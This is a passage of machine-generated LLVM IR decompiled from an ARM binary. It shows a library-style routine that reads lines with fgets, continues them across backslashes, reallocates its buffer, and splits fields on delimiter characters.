  store i32 %v2_15950, i32* %r0.global-to-local, align 4
  %v2_15954 = sub i32 %v5_1594c, %v0_15950
  %v1_15958 = inttoptr i32 %v0_15948 to i32*
  %v2_15958 = load i32, i32* %v1_15958, align 4
  store i32 %v2_15958, i32* %r2.global-to-local, align 4
  %v3_1595c = call i32 @fgets(i32 %v2_15950, i32 %v2_15954, i32 %v2_15958)
  store i32 %v3_1595c, i32* %r0.global-to-local, align 4
  store i32 %v3_1595c, i32* %r4.global-to-local, align 4
  %v2_15960 = icmp eq i32 %v3_1595c, 0
  store i1 %v2_15960, i1* %cpsr_z.global-to-local, align 1
  %v0_15968 = load i32, i32* @r5, align 4
  %v1_15968 = add i32 %v0_15968, 12
  br i1 %v2_15960, label %dec_label_pc_15968, label %dec_label_pc_15980

dec_label_pc_15968:                               ; preds = %dec_label_pc_15948
  store i32 %v1_15968, i32* %r0.global-to-local, align 4
  %v1_1596c = inttoptr i32 %v1_15968 to i32*
  %v2_1596c = load i32, i32* %v1_1596c, align 4
  store i32 %v2_1596c, i32* %r0.global-to-local, align 4
  %v3_1596c = add i32 %v0_15968, 16
  %v4_1596c = inttoptr i32 %v3_1596c to i32*
  %v5_1596c = load i32, i32* %v4_1596c, align 4
  store i32 %v5_1596c, i32* @r2, align 4
  %v2_15974 = inttoptr i32 %v2_1596c to i8*
  %v3_15974 = call i32 @__GI_memset(i8* %v2_15974, i32 0)
  store i32 %v3_15974, i32* %r0.global-to-local, align 4
  %v0_15978 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15b98

dec_label_pc_15980:                               ; preds = %dec_label_pc_15948
  %v2_15980 = inttoptr i32 %v1_15968 to i32*
  %v3_15980 = load i32, i32* %v2_15980, align 4
  store i32 %v3_15980, i32* @r4, align 4
  %v1_15984 = load i32, i32* @r6, align 4
  %v2_15984 = add i32 %v1_15984, %v3_15980
  %v3_15984 = inttoptr i32 %v2_15984 to i8*
  store i32 %v2_15984, i32* %r0.global-to-local, align 4
  %v3_15988 = call i32 @strlen(i8* %v3_15984)
  %v0_15990 = load i32, i32* @r6, align 4
  %v2_15990 = add i32 %v0_15990, %v3_15988
  store i32 %v2_15990, i32* @r6, align 4
  %v0_15994 = load i32, i32* @r4, align 4
  store i32 %v0_15994, i32* @r0, align 4
  %v2_15998 = call i32 @__GI_strchr(i32 %v0_15994, i32 10)
  store i32 %v2_15998, i32* %r0.global-to-local, align 4
  %v2_1599c = icmp eq i32 %v2_15998, 0
  store i1 %v2_1599c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1599c, label %dec_label_pc_159c8, label %dec_label_pc_159a4

dec_label_pc_159a4:                               ; preds = %dec_label_pc_15980
  %v1_159a4 = inttoptr i32 %v2_15998 to i8*
  %v2_159a4 = load i8, i8* %v1_159a4, align 1
  %v3_159a4 = zext i8 %v2_159a4 to i32
  %v1_159a8 = add nuw nsw i32 %v3_159a4, 255
  %v1_159ac = urem i32 %v1_159a8, 256
  store i32 %v1_159ac, i32* %r3.global-to-local, align 4
  %v7_159b0 = icmp eq i32 %v1_159ac, 92
  store i1 %v7_159b0, i1* %cpsr_z.global-to-local, align 1
  %v1_159b4 = trunc i32 %v1_159a8 to i8
  store i8 %v1_159b4, i8* %v1_159a4, align 1
  %v0_159b8 = load i32, i32* @r6, align 4
  %v1_159b8 = add i32 %v0_159b8, -1
  store i32 %v1_159b8, i32* @r6, align 4
  %v0_159bc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_159bc, label %dec_label_pc_159c0, label %dec_label_pc_15a4c

dec_label_pc_159c0:                               ; preds = %dec_label_pc_159a4
  %v1_159c0 = add i32 %v0_159b8, -2
  store i32 %v1_159c0, i32* @r6, align 4
  br label %dec_label_pc_15948

dec_label_pc_159c8:                               ; preds = %dec_label_pc_15980
  %v0_159c8 = load i32, i32* @r5, align 4
  %v1_159c8 = add i32 %v0_159c8, 20
  %v2_159c8 = inttoptr i32 %v1_159c8 to i32*
  %v3_159c8 = load i32, i32* %v2_159c8, align 4
  store i32 %v3_159c8, i32* %r3.global-to-local, align 4
  %v2_159cc = icmp eq i32 %v3_159c8, 0
  store i1 %v2_159cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_159cc, label %dec_label_pc_15a04, label %dec_label_pc_159d4

dec_label_pc_159d4:                               ; preds = %dec_label_pc_159c8
  %v1_159d4 = add i32 %v0_159c8, 16
  %v2_159d4 = inttoptr i32 %v1_159d4 to i32*
  %v3_159d4 = load i32, i32* %v2_159d4, align 4
  store i32 %v3_159d4, i32* %r3.global-to-local, align 4
  %v1_159d8 = add i32 %v0_159c8, 8
  %v2_159d8 = inttoptr i32 %v1_159d8 to i32*
  %v3_159d8 = load i32, i32* %v2_159d8, align 4
  %v1_159dc = add i32 %v3_159d4, 4096
  store i32 %v1_159dc, i32* %r3.global-to-local, align 4
  %v2_159e0 = add i32 %v3_159d8, %v1_159dc
  store i32 %v1_159dc, i32* %v2_159d4, align 4
  %v0_159e8 = load i32, i32* @r5, align 4
  %v1_159e8 = add i32 %v0_159e8, 4
  %v2_159e8 = inttoptr i32 %v1_159e8 to i32*
  %v3_159e8 = load i32, i32* %v2_159e8, align 4
  store i32 %v3_159e8, i32* %r0.global-to-local, align 4
  %v2_159ec = inttoptr i32 %v3_159e8 to i32*
  %v3_159ec = call i32 @realloc(i32* %v2_159ec, i32 %v2_159e0)
  store i32 %v3_159ec, i32* %r0.global-to-local, align 4
  %v0_159f0 = load i32, i32* @r5, align 4
  %v1_159f0 = add i32 %v0_159f0, 8
  %v2_159f0 = inttoptr i32 %v1_159f0 to i32*
  %v3_159f0 = load i32, i32* %v2_159f0, align 4
  %v2_159f4 = add i32 %v3_159f0, %v3_159ec
  store i32 %v2_159f4, i32* %r3.global-to-local, align 4
  %v2_159f8 = add i32 %v0_159f0, 12
  %v3_159f8 = inttoptr i32 %v2_159f8 to i32*
  store i32 %v2_159f4, i32* %v3_159f8, align 4
  %v1_159fc = load i32, i32* @r5, align 4
  %v2_159fc = add i32 %v1_159fc, 4
  %v3_159fc = inttoptr i32 %v2_159fc to i32*
  store i32 %v3_159ec, i32* %v3_159fc, align 4
  %v0_15950.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15948

dec_label_pc_15a04:                               ; preds = %dec_label_pc_159c8, %.dec_label_pc_15a04_crit_edge
  %v0_15a04 = phi i32 [ %v0_15a04.pre, %.dec_label_pc_15a04_crit_edge ], [ %v0_159c8, %dec_label_pc_159c8 ]
  %v1_15a04 = inttoptr i32 %v0_15a04 to i32*
  %v2_15a04 = load i32, i32* %v1_15a04, align 4
  %v1_15a08 = add i32 %v2_15a04, 52
  %v2_15a08 = inttoptr i32 %v1_15a08 to i32*
  %v3_15a08 = load i32, i32* %v2_15a08, align 4
  store i32 %v3_15a08, i32* %r3.global-to-local, align 4
  %v2_15a0c = icmp eq i32 %v3_15a08, 0
  store i1 %v2_15a0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15a0c, label %dec_label_pc_15a38, label %dec_label_pc_15a14

dec_label_pc_15a14:                               ; preds = %dec_label_pc_15a04
  %v1_15a14 = add i32 %v2_15a04, 16
  %v2_15a14 = inttoptr i32 %v1_15a14 to i32*
  %v3_15a14 = load i32, i32* %v2_15a14, align 4
  store i32 %v3_15a14, i32* %r2.global-to-local, align 4
  %v1_15a18 = add i32 %v2_15a04, 24
  %v2_15a18 = inttoptr i32 %v1_15a18 to i32*
  %v3_15a18 = load i32, i32* %v2_15a18, align 4
  store i32 %v3_15a18, i32* %r3.global-to-local, align 4
  %v3_15a1c = icmp ult i32 %v3_15a14, %v3_15a18
  %v9_15a1c = icmp eq i32 %v3_15a14, %v3_15a18
  store i1 %v9_15a1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15a1c, label %dec_label_pc_15a40thread-pre-split, label %dec_label_pc_15a2c

dec_label_pc_15a2c:                               ; preds = %dec_label_pc_15a14
  store i32 %v2_15a04, i32* %r0.global-to-local, align 4
  %v1_15a30 = inttoptr i32 %v2_15a04 to i16*
  %v2_15a30 = call i32 @getc_unlocked(i16* %v1_15a30)
  store i32 %v2_15a30, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15a40

dec_label_pc_15a38:                               ; preds = %dec_label_pc_15a04
  store i32 %v2_15a04, i32* %r0.global-to-local, align 4
  %v1_15a3c = call i32 @__GI_fgetc(i32 %v2_15a04)
  store i32 %v1_15a3c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15a40

dec_label_pc_15a40thread-pre-split:               ; preds = %dec_label_pc_15a14
  %v2_15a20 = inttoptr i32 %v3_15a14 to i8*
  %v3_15a20 = load i8, i8* %v2_15a20, align 1
  %v4_15a20 = zext i8 %v3_15a20 to i32
  store i32 %v4_15a20, i32* %r0.global-to-local, align 4
  %v6_15a20 = add i32 %v3_15a14, 1
  store i32 %v6_15a20, i32* %r2.global-to-local, align 4
  store i32 %v6_15a20, i32* %v2_15a14, align 4
  %v0_15a40.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15a40

dec_label_pc_15a40:                               ; preds = %dec_label_pc_15a40thread-pre-split, %dec_label_pc_15a2c, %dec_label_pc_15a38
  %v1_15a44 = phi i32 [ %v0_15a40.pr, %dec_label_pc_15a40thread-pre-split ], [ %v2_15a30, %dec_label_pc_15a2c ], [ %v1_15a3c, %dec_label_pc_15a38 ]
  %v7_15a40 = icmp eq i32 %v1_15a44, 10
  store i1 %v7_15a40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15a40, label %dec_label_pc_15a4c.loopexit, label %bb68

bb68:                                             ; preds = %dec_label_pc_15a40
  %v8_15a44 = icmp eq i32 %v1_15a44, -1
  store i1 %v8_15a44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_15a44, label %dec_label_pc_15a4c.loopexit, label %.dec_label_pc_15a04_crit_edge

.dec_label_pc_15a04_crit_edge:                    ; preds = %bb68
  %v0_15a04.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15a04

dec_label_pc_15a4c.loopexit:                      ; preds = %bb68, %dec_label_pc_15a40
  %v0_15a4c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15a4c

dec_label_pc_15a4c:                               ; preds = %dec_label_pc_159a4, %dec_label_pc_15a4c.loopexit
  %v0_15a4c = phi i32 [ %v0_15a4c.pre, %dec_label_pc_15a4c.loopexit ], [ %v1_159b8, %dec_label_pc_159a4 ]
  %v7_15a4c = icmp eq i32 %v0_15a4c, -1
  store i1 %v7_15a4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15a4c, label %dec_label_pc_15b94, label %dec_label_pc_15a54

dec_label_pc_15a54:                               ; preds = %dec_label_pc_15a4c
  %v0_15a54 = load i32, i32* @r5, align 4
  %v1_15a54 = add i32 %v0_15a54, 4
  %v2_15a54 = inttoptr i32 %v1_15a54 to i32*
  %v3_15a54 = load i32, i32* %v2_15a54, align 4
  store i32 %v3_15a54, i32* %r0.global-to-local, align 4
  store i32 %v3_158a8, i32* @r2, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  store i32 %v3_15a54, i32* %v2_15a60, align 4
  %v0_15a64 = load i32, i32* @fp, align 4
  %v2_15a68 = inttoptr i32 %v3_15a54 to i8*
  %v3_15a68 = call i32 @__GI_memset(i8* %v2_15a68, i32 %v0_15a64)
  store i32 %v3_15a68, i32* %r0.global-to-local, align 4
  store i32 %v1_158bc, i32* %r2.global-to-local, align 4
  store i1 %v2_15a70, i1* %cpsr_z.global-to-local, align 1
  %v0_15a74 = load i32, i32* @r5, align 4
  %v1_15a74 = add i32 %v0_15a74, 12
  %v2_15a74 = inttoptr i32 %v1_15a74 to i32*
  %v3_15a74 = load i32, i32* %v2_15a74, align 4
  store i32 %v3_15a74, i32* @r4, align 4
  br i1 %v2_15a70, label %dec_label_pc_15a8c, label %dec_label_pc_15a7c

dec_label_pc_15a7c:                               ; preds = %dec_label_pc_15a54
  store i32 %v3_15a74, i32* @r0, align 4
  %v1_15a84 = inttoptr i32 %v3_15a74 to i8*
  %v2_15a84 = call i32 @__GI_strspn(i8* %v1_15a84)
  store i32 %v2_15a84, i32* %r0.global-to-local, align 4
  %v0_15a88 = load i32, i32* @r4, align 4
  %v2_15a88 = add i32 %v0_15a88, %v2_15a84
  store i32 %v2_15a88, i32* @r4, align 4
  br label %dec_label_pc_15a8c

dec_label_pc_15a8c:                               ; preds = %dec_label_pc_15a54, %dec_label_pc_15a7c
  %v0_15b6413 = phi i32 [ %v3_15a74, %dec_label_pc_15a54 ], [ %v2_15a88, %dec_label_pc_15a7c ]
  %v1_15a8c = inttoptr i32 %v0_15b6413 to i8*
  %v2_15a8c = load i8, i8* %v1_15a8c, align 1
  %v3_15a8c = zext i8 %v2_15a8c to i32
  store i32 %v3_15a8c, i32* %r2.global-to-local, align 4
  %v2_15a90 = icmp eq i8 %v2_15a8c, 0
  store i1 %v2_15a90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15a90, label %dec_label_pc_158e4.backedge, label %dec_label_pc_15a98

dec_label_pc_158e4.backedge:                      ; preds = %dec_label_pc_15a8c, %dec_label_pc_15b8c, %dec_label_pc_15a98
  %v0_158e4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_158e4

dec_label_pc_15a98:                               ; preds = %dec_label_pc_15a8c
  %v0_15a98 = load i32, i32* @r7, align 4
  %v1_15a98 = inttoptr i32 %v0_15a98 to i8*
  %v2_15a98 = load i8, i8* %v1_15a98, align 1
  %v3_15a98 = zext i8 %v2_15a98 to i32
  store i32 %v3_15a98, i32* %r3.global-to-local, align 4
  %v9_15a9c = icmp eq i8 %v2_15a98, %v2_15a8c
  store i1 %v9_15a9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15a9c, label %dec_label_pc_158e4.backedge, label %dec_label_pc_15b64.preheader

dec_label_pc_15b64.preheader:                     ; preds = %dec_label_pc_15a98
  %v1_15aa0 = load i32, i32* @fp, align 4
  store i32 %v1_15aa0, i32* @r6, align 4
  %v2_15b6415 = load i8, i8* %v1_15a8c, align 1
  %v3_15b6416 = zext i8 %v2_15b6415 to i32
  store i32 %v3_15b6416, i32* %r2.global-to-local, align 4
  %v2_15b6817 = icmp eq i8 %v2_15b6415, 0
  store i1 %v2_15b6817, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15b6817, label %dec_label_pc_15b80, label %dec_label_pc_15b70.preheader

dec_label_pc_15b70.preheader:                     ; preds = %dec_label_pc_15b64.preheader
  %v2_15b7082 = load i8, i8* %v1_15a98, align 1
  %v3_15b7083 = zext i8 %v2_15b7082 to i32
  store i32 %v3_15b7083, i32* %r3.global-to-local, align 4
  %v9_15b7486 = icmp eq i8 %v2_15b7082, %v2_15b6415
  store i1 %v9_15b7486, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15b7486, label %dec_label_pc_15b80, label %bb74

dec_label_pc_15aac:                               ; preds = %bb74
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_15ab0 = load i32, i32* %v2_15a60, align 4
  store i32 %v2_15ab0, i32* %r3.global-to-local, align 4
  store i32 %v1_158c0, i32* %r2.global-to-local, align 4
  %v9_15ab8 = icmp eq i32 %v2_15abc88, %v1_158c0
  store i1 %v9_15ab8, i1* %cpsr_z.global-to-local, align 1
  %v5_15abc = mul i32 %v2_15abc88, 4
  %v6_15abc = add i32 %v2_15ab0, %v5_15abc
  %v7_15abc = inttoptr i32 %v6_15abc to i32*
  store i32 %v0_15abc87, i32* %v7_15abc, align 4
  br i1 %v9_15ab8, label %dec_label_pc_15ac4, label %dec_label_pc_15ad0

dec_label_pc_15ac4:                               ; preds = %dec_label_pc_15aac
  store i32 %v1_158cc, i32* %r3.global-to-local, align 4
  store i1 %v2_15ac8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15ac8, label %dec_label_pc_15ad0, label %dec_label_pc_15af0

dec_label_pc_15ad0:                               ; preds = %dec_label_pc_15ac4, %dec_label_pc_15aac
  %v0_15ad0 = load i32, i32* @r7, align 4
  %v1_15ad0 = inttoptr i32 %v0_15ad0 to i8*
  %v2_15ad0 = load i8, i8* %v1_15ad0, align 1
  %v3_15ad0 = zext i8 %v2_15ad0 to i32
  store i32 %v3_15ad0, i32* %r3.global-to-local, align 4
  %v2_15ad4 = icmp eq i8 %v2_15ad0, 0
  store i1 %v2_15ad4, i1* %cpsr_z.global-to-local, align 1
  %v0_15ad8 = load i32, i32* @r4, align 4
  store i32 %v0_15ad8, i32* @r0, align 4
  %v1_15adc = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_15ad4, i32 %v1_15adc, i32 %v0_15ad0
  store i32 %storemerge, i32* @r1, align 4
  %v0_15ae4 = call i32 @strcspn()
  store i32 %v0_15ae4, i32* %r0.global-to-local, align 4
  %v0_15ae8 = load i32, i32* @r4, align 4
  %v2_15ae8 = add i32 %v0_15ae8, %v0_15ae4
  store i32 %v2_15ae8, i32* @r4, align 4
  br label %dec_label_pc_15b28

dec_label_pc_15af0:                               ; preds = %dec_label_pc_15ac4
  %v0_15af0 = load i32, i32* @r4, align 4
  store i32 %v0_15af0, i32* @r0, align 4
  %v0_15af4 = load i32, i32* @r7, align 4
  %v1_15af4 = inttoptr i32 %v0_15af4 to i8*
  %v2_15af4 = load i8, i8* %v1_15af4, align 1
  %v3_15af4 = zext i8 %v2_15af4 to i32
  %v5_15af8 = call i32 @__GI_strchrnul(i32 %v0_15af0, i32 %v3_15af4, i32 %v1_158c0, i32 %v1_158cc)
  store i32 %v5_15af8, i32* %r0.global-to-local, align 4
  store i32 %v1_158bc, i32* %r2.global-to-local, align 4
  store i1 %v2_15a70, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_15af8, i32* @r4, align 4
  br i1 %v2_15a70, label %dec_label_pc_15b28, label %dec_label_pc_15b14

dec_label_pc_15b10:                               ; preds = %dec_label_pc_15b14
  %v1_15b10 = add i32 %v0_15b28.pre, -1
  store i32 %v1_15b10, i32* @r4, align 4
  br label %dec_label_pc_15b14

dec_label_pc_15b14:                               ; preds = %dec_label_pc_15af0, %dec_label_pc_15b10
  %v0_15b14 = phi i32 [ %v1_15b10, %dec_label_pc_15b10 ], [ %v5_15af8, %dec_label_pc_15af0 ]
  %v1_15b14 = add i32 %v0_15b14, -1
  %v2_15b14 = inttoptr i32 %v1_15b14 to i8*
  %v3_15b14 = load i8, i8* %v2_15b14, align 1
  %v4_15b14 = zext i8 %v3_15b14 to i32
  %v0_15b18 = load i32, i32* @sl, align 4
  store i32 %v0_15b18, i32* @r0, align 4
  %v2_15b1c = call i32 @__GI_strchr(i32 %v0_15b18, i32 %v4_15b14)
  store i32 %v2_15b1c, i32* %r0.global-to-local, align 4
  %v2_15b20 = icmp eq i32 %v2_15b1c, 0
  store i1 %v2_15b20, i1* %cpsr_z.global-to-local, align 1
  %v0_15b28.pre = load i32, i32* @r4, align 4
  br i1 %v2_15b20, label %dec_label_pc_15b28, label %dec_label_pc_15b10

dec_label_pc_15b28:                               ; preds = %dec_label_pc_15b14, %dec_label_pc_15af0, %dec_label_pc_15ad0
  %v3_15b34 = phi i32 [ %v5_15af8, %dec_label_pc_15af0 ], [ %v2_15ae8, %dec_label_pc_15ad0 ], [ %v0_15b28.pre, %dec_label_pc_15b14 ]
  %v1_15b28 = inttoptr i32 %v3_15b34 to i8*
  %v2_15b28 = load i8, i8* %v1_15b28, align 1
  %v3_15b28 = zext i8 %v2_15b28 to i32
  store i32 %v3_15b28, i32* %r2.global-to-local, align 4
  %v0_15b2c = load i32, i32* @r7, align 4
  %v1_15b2c = inttoptr i32 %v0_15b2c to i8*
  %v2_15b2c = load i8, i8* %v1_15b2c, align 1
  %v3_15b2c = zext i8 %v2_15b2c to i32
  store i32 %v3_15b2c, i32* %r3.global-to-local, align 4
  %v9_15b30 = icmp eq i8 %v2_15b2c, %v2_15b28
  store i1 %v9_15b30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15b30, label %bb71, label %dec_label_pc_15b3c

bb71:                                             ; preds = %dec_label_pc_15b28
  %v1_15b34 = load i32, i32* @fp, align 4
  %v2_15b34 = trunc i32 %v1_15b34 to i8
  store i8 %v2_15b34, i8* %v1_15b28, align 1
  %v0_15b38.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15b38.pr, label %bb73, label %.dec_label_pc_15b3c_crit_edge

.dec_label_pc_15b3c_crit_edge:                    ; preds = %bb71
  %v0_15b3c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15b3c

dec_label_pc_15b3c:                               ; preds = %.dec_label_pc_15b3c_crit_edge, %dec_label_pc_15b28
  %v0_15b3c = phi i32 [ %v0_15b3c.pre, %.dec_label_pc_15b3c_crit_edge ], [ %v3_15b28, %dec_label_pc_15b28 ]
  %v2_15b3c = icmp eq i32 %v0_15b3c, 0
  store i1 %v2_15b3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15b3c, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_15b3c
  %v1_15b40 = load i32, i32* @fp, align 4
  %v2_15b40 = trunc i32 %v1_15b40 to i8
  %v3_15b40 = load i32, i32* @r4, align 4
  %v4_15b40 = inttoptr i32 %v3_15b40 to i8*
  store i8 %v2_15b40, i8* %v4_15b40, align 1
  %v5_15b40 = load i32, i32* @r4, align 4
  %v6_15b40 = add i32 %v5_15b40, 1
  store i32 %v6_15b40, i32* @r4, align 4
  br label %bb73

bb73:                                             ; preds = %bb71, %dec_label_pc_15b3c, %bb72
  %v2_15b44 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_15b44, i32* %r3.global-to-local, align 4
  %v2_15b48 = icmp eq i32 %v2_15b44, 0
  store i1 %v2_15b48, i1* %cpsr_z.global-to-local, align 1
  %v0_15b64.pre = load i32, i32* @r4, align 4
  br i1 %v2_15b48, label %dec_label_pc_15b60, label %dec_label_pc_15b50

dec_label_pc_15b50:                               ; preds = %bb73
  store i32 %v0_15b64.pre, i32* @r0, align 4
  %v1_15b58 = inttoptr i32 %v0_15b64.pre to i8*
  %v2_15b58 = call i32 @__GI_strspn(i8* %v1_15b58)
  store i32 %v2_15b58, i32* %r0.global-to-local, align 4
  %v0_15b5c = load i32, i32* @r4, align 4
  %v2_15b5c = add i32 %v0_15b5c, %v2_15b58
  store i32 %v2_15b5c, i32* @r4, align 4
  br label %dec_label_pc_15b60

dec_label_pc_15b60:                               ; preds = %bb73, %dec_label_pc_15b50
  %v0_15b64 = phi i32 [ %v2_15b5c, %dec_label_pc_15b50 ], [ %v0_15b64.pre, %bb73 ]
  %v0_15b60 = load i32, i32* @r6, align 4
  %v1_15b60 = add i32 %v0_15b60, 1
  store i32 %v1_15b60, i32* @r6, align 4
  %v1_15b64 = inttoptr i32 %v0_15b64 to i8*
  %v2_15b64 = load i8, i8* %v1_15b64, align 1
  %v3_15b64 = zext i8 %v2_15b64 to i32
  store i32 %v3_15b64, i32* %r2.global-to-local, align 4
  %v2_15b68 = icmp eq i8 %v2_15b64, 0
  store i1 %v2_15b68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15b68, label %dec_label_pc_15b80, label %dec_label_pc_15b60.dec_label_pc_15b70_crit_edge

dec_label_pc_15b60.dec_label_pc_15b70_crit_edge:  ; preds = %dec_label_pc_15b60
  %v0_15b70.pre = load i32, i32* @r7, align 4
  %v1_15b70 = inttoptr i32 %v0_15b70.pre to i8*
  %v2_15b70 = load i8, i8* %v1_15b70, align 1
  %v3_15b70 = zext i8 %v2_15b70 to i32
  store i32 %v3_15b70, i32* %r3.global-to-local, align 4
  %v9_15b74 = icmp eq i8 %v2_15b70, %v2_15b64
  store i1 %v9_15b74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15b74, label %dec_label_pc_15b80, label %bb74

bb74:                                             ; preds = %dec_label_pc_15b70.preheader, %dec_label_pc_15b60.dec_label_pc_15b70_crit_edge
  %v2_15abc88 = phi i32 [ %v1_15b60, %dec_label_pc_15b60.dec_label_pc_15b70_crit_edge ], [ %v1_15aa0, %dec_label_pc_15b70.preheader ]
  %v0_15abc87 = phi i32 [ %v0_15b64, %dec_label_pc_15b60.dec_label_pc_15b70_crit_edge ], [ %v0_15b6413, %dec_label_pc_15b70.preheader ]
  %v2_15b78 = load i32, i32* @sb, align 4
  %v3_15b78 = sub i32 %v2_15abc88, %v2_15b78
  %v5_15b78 = xor i32 %v2_15b78, %v2_15abc88
  %v6_15b78 = xor i32 %v3_15b78, %v2_15abc88
  %v7_15b78 = and i32 %v6_15b78, %v5_15b78
  %v8_15b78 = icmp slt i32 %v7_15b78, 0
  %v9_15b78 = icmp slt i32 %v3_15b78, 0
  %v10_15b78 = icmp eq i32 %v2_15abc88, %v2_15b78
  store i1 %v10_15b78, i1* %cpsr_z.global-to-local, align 1
  %v2_15b7c = xor i1 %v9_15b78, %v8_15b78
  br i1 %v2_15b7c, label %dec_label_pc_15aac, label %dec_label_pc_15b80

dec_label_pc_15b80:                               ; preds = %dec_label_pc_15b70.preheader, %bb74, %dec_label_pc_15b60, %dec_label_pc_15b60.dec_label_pc_15b70_crit_edge, %dec_label_pc_15b64.preheader
  %v0_15b84 = phi i32 [ %v1_15aa0, %dec_label_pc_15b64.preheader ], [ %v1_15aa0, %dec_label_pc_15b70.preheader ], [ %v2_15abc88, %bb74 ], [ %v1_15b60, %dec_label_pc_15b60 ], [ %v1_15b60, %dec_label_pc_15b60.dec_label_pc_15b70_crit_edge ]
  store i32 %v3_158a4, i32* %r2.global-to-local, align 4
  %v9_15b84 = icmp eq i32 %v0_15b84, %v3_158a4
  store i1 %v9_15b84, i1* %cpsr_z.global-to-local, align 1
  %v6_15b88 = icmp slt i32 %v0_15b84, %v3_158a4
  br i1 %v6_15b88, label %dec_label_pc_15b8c, label %dec_label_pc_15b98

dec_label_pc_15b8c:                               ; preds = %dec_label_pc_15b80
  %v0_15b8c = load i32, i32* @r8, align 4
  %v1_15b8c = and i32 %v0_15b8c, 1048576
  %v2_15b8c = icmp eq i32 %v1_15b8c, 0
  store i1 %v2_15b8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15b8c, label %dec_label_pc_158e4.backedge, label %dec_label_pc_15b94

dec_label_pc_15b94:                               ; preds = %dec_label_pc_15b8c, %dec_label_pc_15a4c, %.thread, %entry
  br label %dec_label_pc_15b98

dec_label_pc_15b98:                               ; preds = %dec_label_pc_15b80, %dec_label_pc_15968, %dec_label_pc_15b94
  %v0_15b98 = phi i32 [ %v0_15978, %dec_label_pc_15968 ], [ 0, %dec_label_pc_15b94 ], [ %v0_15b84, %dec_label_pc_15b80 ]
  store i32 %v0_15b98, i32* %r0.global-to-local, align 4
  store i32 %v3_15880, i32* @r4, align 4
  store i32 %v6_15880, i32* @r5, align 4
  store i32 %v9_15880, i32* @r6, align 4
  store i32 %v12_15880, i32* @r7, align 4
  store i32 %v15_15880, i32* @r8, align 4
  store i32 %v18_15880, i32* @sb, align 4
  store i32 %v21_15880, i32* @sl, align 4
  store i32 %v24_15880, i32* @fp, align 4
  ret i32 %v0_15b98

; uselistorder directives
  uselistorder i32 %v0_15b98, { 1, 0 }
  uselistorder i32 %v0_15b84, { 0, 2, 1 }
  uselistorder i32 %v3_15b78, { 1, 0 }
  uselistorder i32 %v2_15b78, { 1, 0, 2 }
  uselistorder i32 %v2_15abc88, { 0, 1, 6, 5, 2, 3, 4 }
  uselistorder i1 %v9_15b74, { 1, 0 }
  uselistorder i32 %v0_15b64.pre, { 0, 2, 1 }
  uselistorder i32 %v5_15af8, { 1, 0, 2, 3 }
  uselistorder i1 %v9_15b7486, { 1, 0 }
  uselistorder i1 %v9_15a9c, { 1, 0 }
  uselistorder i32 %v3_15a74, { 0, 2, 1, 3 }
  uselistorder i1 %v7_15a4c, { 1, 0 }
  uselistorder i1 %v8_15a44, { 1, 0 }
  uselistorder i32 %v3_15a14, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_15a04, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v3_159ec, { 1, 0, 2 }
  uselistorder i32 %v1_159dc, { 1, 0, 2 }
  uselistorder i32 %v0_159c8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_159c0, { 1, 0 }
  uselistorder i32 %v1_159ac, { 1, 0 }
  uselistorder i32 %v1_159a8, { 1, 0 }
  uselistorder i32 %v2_15984, { 1, 0 }
  uselistorder i32 %v1_15968, { 2, 0, 1 }
  uselistorder i32 %v0_15950, { 1, 0 }
  uselistorder i32 %v1_15940, { 0, 2, 1 }
  uselistorder i1 %v2_15a70, { 1, 0, 2, 3 }
  uselistorder i32 %v1_158cc, { 2, 0, 1, 3 }
  uselistorder i32 %v1_158c0, { 2, 1, 0 }
  uselistorder i32 %v3_158a8, { 1, 0 }
  uselistorder i32 %v3_158a4, { 2, 1, 0 }
  uselistorder i32 %v1_1589c, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 25, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 8, 3, 4, 5, 6, 7, 1, 9, 10, 11, 12, 13, 14, 15, 16, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 8, 7, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 28, 26, 27, 0 }
